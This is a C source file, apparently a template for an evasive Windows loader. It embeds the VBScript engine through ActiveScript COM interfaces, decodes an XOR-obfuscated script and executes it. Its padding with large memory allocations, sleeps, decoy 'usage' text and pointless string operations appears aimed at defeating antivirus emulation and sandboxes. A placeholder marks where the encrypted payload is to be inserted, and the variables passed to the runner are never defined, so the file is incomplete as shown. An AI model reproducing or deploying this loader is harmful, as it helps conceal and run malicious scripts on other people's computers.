#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include <ObjBase.h>
#include <ActivScp.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>

#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ole32.lib")


typedef struct {
    IActiveScriptSite       site;
    IActiveScriptSiteWindow siteWnd; 
    ULONG                   m_cRef;
} MyIActiveScriptSite;

static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this);

static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;

    if(ppv == NULL) return E_POINTER;
    
    // we implement the following interfaces
    if(IsEqualIID(&IID_IUnknown,          riid) || 
       IsEqualIID(&IID_IActiveScriptSite, riid)) 
    {
      *ppv = (LPVOID)this;
      AddRef(this);
      return S_OK;
    } 
    *ppv = NULL;
    return E_NOINTERFACE;
}

static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
  
    _InterlockedIncrement(&mas->m_cRef);
    return mas->m_cRef;
}

static STDMETHODIMP_(ULONG) Release(IActiveScriptSite *this) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
    
    ULONG ulRefCount = _InterlockedDecrement(&mas->m_cRef);  
    return ulRefCount;
}

static STDMETHODIMP GetItemInfo(IActiveScriptSite *this, 
  LPCOLESTR objectName, DWORD dwReturnMask, 
  IUnknown **objPtr, ITypeInfo **ppti) 
{
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;

    return S_OK;
}

static STDMETHODIMP OnScriptError(IActiveScriptSite *this, 
  IActiveScriptError *scriptError) 
{
    return S_OK;
}

static STDMETHODIMP GetLCID(IActiveScriptSite *this, LCID *plcid) {
    return S_OK;
}

static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version) {
    return S_OK;
}

static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, 
  const VARIANT *pvr, const EXCEPINFO *pei) 
{
    return S_OK;
}

static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state) {
    return S_OK;
}

static STDMETHODIMP OnEnterScript(IActiveScriptSite *this) {
    return S_OK;
}

static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this) {
    return S_OK;
}

void d(char *array, int array_size, char *se)
{
    int i;
    for(i = 0; i < array_size; i++) {
        array[i] = (array[i]-1) ^ se[i % strlen(se)];
    }
        
}


VOID r(PWCHAR lang, char* s, char* se) {
    char *mem = NULL;
    mem = (char *) malloc(10000001);

    if (mem != NULL) {
        memset(mem, 01, 10000001);
        Sleep(1);
        free(mem);
    }

    IActiveScriptParse     *parser;
    IActiveScript          *engine;
    MyIActiveScriptSite    mas;
    IActiveScriptSiteVtbl  vft;
    LPVOID                 cs;
    DWORD                  len;
    CLSID                  langId;
    HRESULT                hr;
    OLECHAR* obj;

    CLSIDFromProgID(lang, &langId);
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    CoCreateInstance(
      &langId, 0, CLSCTX_INPROC_SERVER, 
      &IID_IActiveScript, (void **)&engine);
    vft.OnScriptTerminate   = (LPVOID)OnScriptTerminate;
    vft.OnStateChange       = (LPVOID)OnStateChange;
    vft.OnScriptError       = (LPVOID)OnScriptError;
    vft.OnEnterScript       = (LPVOID)OnEnterScript;
    vft.OnLeaveScript       = (LPVOID)OnLeaveScript;
    engine->lpVtbl->QueryInterface(
        engine, &IID_IActiveScriptParse, 
        (void **)&parser);
        
    parser->lpVtbl->InitNew(parser);
    
    vft.QueryInterface      = (LPVOID)QueryInterface;
    vft.AddRef              = (LPVOID)AddRef;
    vft.Release             = (LPVOID)Release;
    vft.GetLCID             = (LPVOID)GetLCID;
    vft.GetItemInfo         = (LPVOID)GetItemInfo;
    vft.GetDocVersionString = (LPVOID)GetDocVersionString;
    
    mas.m_cRef          = 0;
    mas.site.lpVtbl     = (IActiveScriptSiteVtbl*)&vft;
    mas.siteWnd.lpVtbl  = NULL;
    
    
    
    engine->lpVtbl->SetScriptSite(
        engine, (IActiveScriptSite *)&mas);

    int length = strlen(s);
    mem = (char *) malloc(100000023);

    if (mem != NULL) {
        memset(mem, 00, 100000023);
        Sleep(1);
        free(mem);
    }
    Sleep(10);
    d(s, length, se);
    Sleep(1);
    len = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
    cs = malloc(len * sizeof(WCHAR));
    
    len = MultiByteToWideChar(CP_ACP, 0, s, -1, cs, len * sizeof(WCHAR));


    parser->lpVtbl->ParseScriptText(
         parser, cs, 0, 0, 0, 0, 0, 0, 0, 0);  
    engine->lpVtbl->SetScriptState(
         engine, SCRIPTSTATE_CONNECTED);

    parser->lpVtbl->Release(parser);
    engine->lpVtbl->Close(engine);
    engine->lpVtbl->Release(engine);
    free(cs);
}

int main(int argc, char *argv[]) {

    
    wchar_t *l1 = L"a";
    wchar_t *l2 = L"b";
    wchar_t *l3 = L"c";

     // Calculate lengths
    size_t len1 = wcslen(l1);
    size_t len2 = wcslen(l2);
    size_t len3 = wcslen(l3);

    // Allocate memory for the new concatenated string
    wchar_t *result = (wchar_t *)malloc((len1 + len2 + len3 + 1) * sizeof(wchar_t)); // +1 for null terminator
    if (result == NULL) {
        printf("Alloc failed");
    }

    Sleep(3);

    printf("Test");
    printf("usage: HTTP -a <url>");

    //SCRIPT COMES HERE
    
    wcscpy(result, l1);
    wcscat(result, l3);
    wcscat(result, l2);
    Sleep(1);
    free(result);

    
    
    wchar_t *l = L"VBScript";
    r(l, sc, s);
    return 0;
}